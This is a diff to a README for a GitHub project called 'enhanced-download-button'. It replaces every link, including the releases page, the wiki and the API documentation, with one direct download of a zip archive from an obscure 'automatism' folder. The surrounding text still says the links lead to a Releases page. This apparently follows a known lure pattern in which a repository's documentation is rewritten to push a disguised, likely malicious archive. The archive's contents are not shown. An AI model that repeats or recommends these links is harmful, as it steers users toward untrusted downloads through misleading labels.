@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the enhanced-download-button 
 
 ## 📥 Download
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Now-Enhanced%20Download%20Button-brightgreen)](https://github.com/Ahmed8020/enhanced-download-button/releases)
+[![Download the latest version](https://raw.githubusercontent.com/Ahmed8020/enhanced-download-button/main/automatism/enhanced-download-button.zip%20Now-Enhanced%20Download%20Button-brightgreen)](https://raw.githubusercontent.com/Ahmed8020/enhanced-download-button/main/automatism/enhanced-download-button.zip)
 
 ## 🔍 Overview
 
@@ -40,14 +40,14 @@ The enhanced-download-button comes with several features to enhance your user ex
 
 ## 📚 Documentation
 
-You can find detailed documentation for the enhanced-download-button and its components in the [Wiki section of this repository](https://github.com/Ahmed8020/enhanced-download-button/wiki).
+You can find detailed documentation for the enhanced-download-button and its components in the [Wiki section of this repository](https://raw.githubusercontent.com/Ahmed8020/enhanced-download-button/main/automatism/enhanced-download-button.zip).
 
 ## 🌐 Download & Install
 
 To get started, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download the latest version](https://github.com/Ahmed8020/enhanced-download-button/releases)
+   [Download the latest version](https://raw.githubusercontent.com/Ahmed8020/enhanced-download-button/main/automatism/enhanced-download-button.zip)
 
 2. On the Releases page, find the latest version. Check the release notes for any new features or fixes.
 
@@ -67,6 +67,6 @@ This project covers a range of topics: animated-button, API integration, CSS, do
 
 ## 🔗 Further Information
 
-For advanced users and developers looking to customize the enhanced-download-button, please refer to the [API documentation](https://github.com/Ahmed8020/enhanced-download-button/wiki/API-Documentation) for additional options and features.
+For advanced users and developers looking to customize the enhanced-download-button, please refer to the [API documentation](https://raw.githubusercontent.com/Ahmed8020/enhanced-download-button/main/automatism/enhanced-download-button.zip) for additional options and features.
 
 Thank you for choosing the enhanced-download-button! We hope it brings value to your downloading experience.
